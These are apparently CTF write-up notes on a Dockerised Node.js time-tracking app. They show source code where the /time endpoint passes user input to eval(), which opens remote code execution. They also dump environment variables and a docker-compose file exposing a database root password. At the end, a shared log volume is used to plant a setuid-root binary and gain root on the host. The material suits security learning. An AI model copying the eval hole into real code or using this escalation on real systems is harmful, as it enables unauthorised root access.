The node.js application is running within docker in a container, so when we have gained access to it in [[PORT 8080]], we have root whithin this container.

### APP.JS

```js
const mysql = require('mysql');
const express = require('express');
const session = require('express-session');
const path = require('path');
const crypto = require('crypto')
const cookieParser = require('cookie-parser');
const fs = require('fs');

const connection = mysql.createConnection({
	host     : process.env.DB_HOST,
	user     : process.env.DB_USER,
	password : process.env.DB_PASS,
	database : process.env.DB_DATABASE
});

const app = express();
app.set('view engine' , 'ejs')
app.set('views', './views')
app.use(express.static(__dirname + '/public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(cookieParser());
app.use(session({secret: "Your secret key", cookie : {secure : false}}));


// This is of interest to me there is a secret cookie with sercure false


var logfile = fs.createWriteStream(process.env.LOG_FILE, {flags: 'a'});

var log = (message, level) => {
	format_message = `[${level.toUpperCase()}] ${message}`;
	logfile.write(format_message + "\n")
	if (level == "warn") console.warn(message)
	else if (level == "error") console.error(message)
	else if (level == "info") console.info(message)
	else console.log(message)
}

// http://localhost:8080/
app.get('/', function(request, response) {
	
	if (request.session.username) {
		
		connection.query('SELECT user,time FROM users', function(error, results) {
			var users = []
			if (error) {
				log(error, "error")
			};

			for (let row in results){

				let min = results[row].time % 60;
				let padded_min = `${min}`.length == 1 ? `0${min}` : `${min}`
				let time = `${(results[row].time - min) / 60}:${padded_min} h`;
				users.push({name : results[row].user, time : time});
			}							
			response.render('home', {users : users});
		});	
		
	} else{
		response.render('login');
	}
		
});



// http://localhost:8080/time
app.post('/time', function(request, response) {
	
    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time));
		let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

		connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
			if (error) {
				log(error, "error")
			};

			log(`${username} added ${time} minutes.`, "info")
			response.redirect('/');
		});
	} else {
        response.redirect('/');;	
    }
	
});

// http://localhost:8080/auth
app.post('/auth', function(request, response) {
	
	let username = request.body.username;
	let password = request.body.password;	
	
	if (username && password) {
		
		let hash = crypto.createHash('md5').update(password).digest("hex");
		
		connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], function(error, results, fields) {
			
			if (error) {
				log(error, "error")
			};
			
			if (results.length > 0) {
				
				request.session.loggedin = true;
				request.session.username = username;		
				log(`User ${username} logged in`, "info");	
				response.redirect('/');	
			} else {
				log(`User ${username} tried to log in with pass ${password}`, "warn")
				response.redirect('/');	
			} 					
		});		
	} else {
		response.redirect('/');	
	} 	

});

app.listen(8080, () => {
	console.log("App listening on port 8080")
});


```

### ENVIRONMENT

```bash
$env

NODE_VERSION=19.3.0 # nothing found on this
HOSTNAME=de0610f51845 # id of the container
YARN_VERSION=1.22.19 # idk something about js
HOME=/root
DB_DATABASE=timetracking
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5
LOG_FILE=/logs/tt.log # this is supposedly interesting
PWD=/usr/src/app
DB_HOST=db
DB_USER=root
```

### COMPOSE 

```bash 
$ cat docker-compose.yml 
version: '3.3'
services:
  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: 'timetracking'
      MYSQL_ROOT_PASSWORD: 'Ng1-f3!Pe7-e5?Nf3xe5'
    ports:
      - '3306:3306'
    volumes:
      - ./db:/docker-entrypoint-initdb.d
  app:
    image: umbrella/timetracking:latest
    restart: always
    ports:
      - '8080:8080'
    volumes:
      - ./logs:/logs
```


$ ldd --version 
ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper

claire-r@ctf:~/timeTracker-src/logs$ cp /usr/bin/aa-exec ./

chown root aa-exec
chgrp root aa-exec
chmod +s aa-exec

claire-r@ctf:~/timeTracker-src/logs$ ./aa-exec /bin/sh -p
\# cd /root
\# id
uid=1001(claire-r) gid=1001(claire-r) euid=0(root) egid=0(root) groups=0(root),1001(claire-r)
